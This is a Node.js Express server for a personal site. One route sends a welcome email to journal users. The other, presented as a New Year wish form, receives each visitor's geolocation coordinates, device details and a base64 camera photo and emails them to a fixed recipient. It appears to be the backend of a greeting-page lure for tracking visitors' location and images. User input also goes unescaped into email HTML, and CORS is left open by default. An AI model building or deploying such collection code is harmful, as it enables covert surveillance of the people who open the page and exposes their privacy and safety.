require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

app.use(cors({
    origin: process.env.FRONTEND_URL || '*', // You can restrict this to your domains
}));

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
});

// 📮 Route 1: Send New Year Wish Email (unchanged)
app.post('/send-email', (req, res) => {
    const { name, wish, deviceInfo, imageCaptured } = req.body;

    let locationText = 'Device information not provided.';
    if (deviceInfo?.location) {
        locationText = `Location: Latitude: ${deviceInfo.location.latitude}, Longitude: ${deviceInfo.location.longitude}`;
    } else if (deviceInfo?.locationError) {
        locationText = `Location Error: ${deviceInfo.locationError}`;
    }

    let imageAttachment = null;
    if (imageCaptured) {
        try {
            const parts = imageCaptured.split(';base64,');
            const mimeType = parts[0].split(':')[1];
            const imageData = parts[1];
            const imageBuffer = Buffer.from(imageData, 'base64');
            imageAttachment = {
                filename: `captured_image.${mimeType.split('/')[1]}`,
                content: imageBuffer,
                contentType: mimeType,
            };
        } catch (error) {
            console.error("Error processing image:", error);
        }
    }

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.RECIPIENT_EMAIL,
        subject: `New Year Wish from ${name}`,
        html: `
            <p>Name: ${name}</p>
            <p>Wish: ${wish}</p>
            <p>${locationText}</p>
            ${deviceInfo ? `
                <p>User Agent: ${deviceInfo.userAgent}</p>
                <p>Platform: ${deviceInfo.platform}</p>
                <p>Language: ${deviceInfo.language}</p>
            ` : ''}
        `,
        attachments: imageAttachment ? [imageAttachment] : [],
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            return res.status(500).json({ success: false, message: 'Failed to send wish email' });
        }
        console.log('Wish email sent:', info.response);
        res.json({ success: true, message: 'Wish email sent successfully' });
    });
});

// 📮 Route 2: Send Welcome Email to Journal Users
app.post('/send-welcome', (req, res) => {
    const { name, email } = req.body;

    if (!name || !email) {
        return res.status(400).json({ success: false, message: "Name and Email are required." });
    }

    const mailOptions = {
        from: `"Fragments of Me" <${process.env.EMAIL_USER}>`,
        to: email,
        subject: `Welcome to Fragments of Me, ${name}!`,
        html: `
            <div style="font-family: sans-serif; padding: 16px;">
                <h2>Welcome, ${name} 🌿</h2>
                <p>Thank you for joining <strong>Fragments of Me</strong> — your quiet place for thoughts, poetry, and personal fragments.</p>
                <p>We’re glad you’re here. Feel free to explore, write, and reflect.</p>
                <p style="margin-top: 20px;">Warmly,<br/>Salik</p>
            </div>
        `,
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error("Failed to send welcome email:", error);
            return res.status(500).json({ success: false, message: "Failed to send welcome email." });
        }
        console.log(`✅ Welcome email sent to ${email}`);
        res.json({ success: true, message: "Welcome email sent successfully." });
    });
});

app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
});
